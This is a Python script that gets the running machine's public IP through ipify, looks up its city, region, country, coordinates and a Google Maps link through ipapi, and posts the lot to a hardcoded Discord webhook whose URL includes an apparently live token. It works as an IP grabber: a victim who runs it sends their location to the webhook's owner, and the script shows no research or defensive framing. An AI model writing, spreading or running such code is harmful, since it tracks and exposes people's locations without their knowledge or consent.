import requests
import ipapi

WEBHOOK_URL = "https://discord.com/api/webhooks/1121901895619981332/rncvLUA_l_IZK78yFaN2ENuGrdadBJinMEfoAxxmzQfN7iP4UvwCGcgc-Xf9wbONr_cb"

def get_location_info():
    ipserver = requests.get('https://api.ipify.org').text
    soucre = ipapi.location(ip=ipserver)
    return {
        "ip": soucre["ip"],
        "city": soucre["city"],
        "region": soucre["region"],
        "idcountry": soucre["country_code"],
        "Country": soucre["country_name"],
        "callcode": soucre["country_calling_code"],
        "lang": soucre["languages"],
        "org": "org",
        "Latitude": str(soucre["latitude"]),
        "Longitude": str(soucre["longitude"]),
        "googlemap_link": "https://www.google.com/maps/place/{},{}".format(
            str(soucre["latitude"]), str(soucre["longitude"])
        ),
    }


def send_to_discord_webhook(webhook_url, message):
    data = {"content": message}
    response = requests.post(webhook_url, json=data)
    if response.status_code == 204:
        print("Message sent successfully to Discord.")
    else:
        print("Failed to send message to Discord.")
        print("Response status code:", response.status_code)


if __name__ == "__main__":
    location_info = get_location_info()
    message = (
        f"IP Address: {location_info['ip']}\n"
        f"City: {location_info['city']}\n"
        f"Region: {location_info['region']}\n"
        f"Country Code: {location_info['idcountry']}\n"
        f"Country Name: {location_info['Country']}\n"
        f"Country Calling Code: {location_info['callcode']}\n"
        f"Languages: {location_info['lang']}\n"
        f"Organization: {location_info['org']}\n"
        f"Latitude: {location_info['Latitude']}\n"
        f"Longitude: {location_info['Longitude']}\n"
        f"Google Maps: {location_info['googlemap_link']}"
    )

    send_to_discord_webhook(WEBHOOK_URL, message)
